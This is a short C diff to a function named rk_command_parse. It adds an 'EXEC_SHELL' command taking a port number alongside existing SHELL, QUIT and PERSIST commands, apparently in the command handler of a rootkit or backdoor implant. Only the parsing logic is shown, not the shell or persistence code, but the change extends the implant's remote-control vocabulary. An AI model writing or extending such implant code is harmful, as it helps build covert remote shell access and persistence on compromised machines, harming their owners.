@@ -186,6 +186,11 @@ int rk_command_parse(const unsigned char *bytes, size_t length,
 		if (rk_parse_u16(bytes + 6, length - 6, &parsed.shell_port))
 			return -EINVAL;
 		parsed.kind = RK_COMMAND_SHELL;
+	} else if (length > 11 && length <= 16 &&
+		   !memcmp(bytes, "EXEC_SHELL ", 11)) {
+		if (rk_parse_u16(bytes + 11, length - 11, &parsed.shell_port))
+			return -EINVAL;
+		parsed.kind = RK_COMMAND_EXEC_SHELL;
 	} else if (rk_bytes_equal(bytes, length, "QUIT", 4))
 		parsed.kind = RK_COMMAND_QUIT;
 	else if (rk_bytes_equal(bytes, length, "PERSIST", 7))
